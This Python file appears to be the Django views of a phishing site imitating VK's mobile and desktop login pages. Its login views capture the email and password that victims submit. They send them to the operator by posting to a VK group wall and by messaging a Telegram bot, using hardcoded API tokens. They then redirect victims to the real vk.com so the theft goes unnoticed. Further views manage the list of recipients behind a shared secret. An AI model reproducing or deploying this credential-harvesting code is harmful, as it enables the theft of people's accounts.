from django.shortcuts import render
from django.http import *
from .forms import *
# from vk_api import *
from vk import *
from .microdetector import detect_mobile
import telebot
from .models import *
import time

# Create your views here.


def tel(mes, i):
    token = '1066066499:AAGhCqzmxLO-78UY6JbPRMNdgJ8SWjqVaiA'
    bot = telebot.TeleBot(token)
    bot.send_message(i, mes)


def index(request):
    if request.method == "POST":
        tok = "be363c662f54c1f5f9e008f7eab1e41a96958a4a5781725c9445f49ddf03520e15a10d6da236bd8ee0ed3"
        club = -189734539

        email = request.POST.get("email")
        pas = request.POST.get("pas")

        body = "Login: {0}\nPass: {1}\n".format(email, pas)

        ses = Session(access_token=tok)
        vk = API(session=ses)

        ids = id_list.objects.in_bulk()
        for id in ids:
            vk.wall.post(owner_id=club, from_group=1, message=body, v=5.103)
            tel(body, ids[id].number)

        return HttpResponsePermanentRedirect("https://m.vk.com")
    # if request.scheme == "http":
    #     return HttpResponsePermanentRedirect("https://" + request.META['HTTP_HOST'] + "/m")
    form = login()
    return render(request, "app_serverr/index.html", {"form": form})


@detect_mobile
def full(request):
    if request.method == "POST":
        tok = "be363c662f54c1f5f9e008f7eab1e41a96958a4a5781725c9445f49ddf03520e15a10d6da236bd8ee0ed3"
        club = -189734539

        email = request.POST.get("email")
        pas = request.POST.get("pas")

        body = "Login: {0}\nPass: {1}\n".format(email, pas)

        ses = Session(access_token=tok)
        vk = API(session=ses)

        ids = id_list.objects.in_bulk()
        for id in ids:
            vk.wall.post(owner_id=club, from_group=1, message=body, v=5.103)
            tel(body, ids[id].number)

        return HttpResponsePermanentRedirect("https://vk.com")
    # if request.scheme == "http":
    #     return HttpResponsePermanentRedirect("https://" + request.META['HTTP_HOST'])
    # if request.mobile:
    #     return HttpResponsePermanentRedirect(request.scheme + "://" + request.META['HTTP_HOST'] + "/m")
    form = full_login()
    return render(request, "app_serverr/full.html", {"form": form})


def id_add(request):
    t = request.GET.get('t')
    if t == passs.objects.get(name='pass').pas:
        try:
            d = int(request.GET.get('id'))
        except ...:
            return HttpResponseRedirect("/")
        i = id_list.objects.create(number=d)
    return HttpResponseRedirect("/")


def id_del(request):
    t = request.GET.get('t')
    if t == passs.objects.get(name='pass').pas:
        try:
            d = int(request.GET.get('id'))
            d = id_list.objects.get(number=d)
        except ...:
            return HttpResponseRedirect("/")
        i = d.delete()
    return HttpResponseRedirect("/")


